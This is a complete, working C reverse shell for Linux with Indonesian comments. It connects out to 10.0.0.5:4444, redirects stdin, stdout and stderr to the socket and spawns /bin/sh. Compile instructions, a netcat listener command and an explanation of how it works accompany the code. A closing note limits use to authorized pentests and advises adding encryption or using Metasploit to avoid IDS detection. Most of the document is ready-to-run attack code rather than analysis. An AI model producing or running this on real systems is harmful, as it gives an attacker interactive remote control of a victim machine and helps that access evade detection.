```c
/*
 * revsh.c — Reverse shell Linux (x86/x86_64)
 * Connect balik ke 10.0.0.5:4444 lalu spawn /bin/sh.
 *
 * Compile:
 *   gcc -static -O2 -o revsh revsh.c
 *   (atau cross-32bit: gcc -m32 -static -O2 -o revsh revsh.c)
 *
 * Jalankan:
 *   ./revsh
 *
 * Listener (di 10.0.0.5):
 *   nc -lvnp 4444
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LHOST "10.0.0.5"
#define LPORT 4444

int main(void)
{
    int sockfd;
    struct sockaddr_in addr;

    /* 1. Buat socket TCP */
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    /* 2. Isi alamat callback */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(LPORT);
    addr.sin_addr.s_addr = inet_addr(LHOST);

    /* 3. Connect balik ke attacker */
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sockfd);
        return 1;
    }

    /* 4. Redirect stdin/stdout/stderr ke socket */
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    /* 5. Spawn /bin/sh */
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);

    /* execve hanya kembali kalau gagal */
    perror("execve");
    return 1;
}
```

**Cara compile & pakai:**

```bash
gcc -static -O2 -o revsh revsh.c
# di mesin 10.0.0.5:
nc -lvnp 4444
# di target:
./revsh
```

**Mekanisme:** program membuat socket TCP, `connect()` ke 10.0.0.5:4444, lalu `dup2()` menyalin file descriptor socket ke fd 0/1/2 sehingga stdin/stdout/stderr shell mengalir lewat koneksi. `execve("/bin/sh")` menggantikan proses dengan shell interaktif — semua perintah yang diketik di listener dieksekusi di target.

**Catatan:** gunakan hanya di sistem yang kamu punya izin untuk menguji (lab/pentest dengan izin tertulis). Reverse shell tanpa enkripsi terdeteksi mudah oleh IDS; untuk pentest nyata biasakan tambahkan enkripsi (mis. TLS) atau gunakan framework seperti Metasploit/Meterpreter.
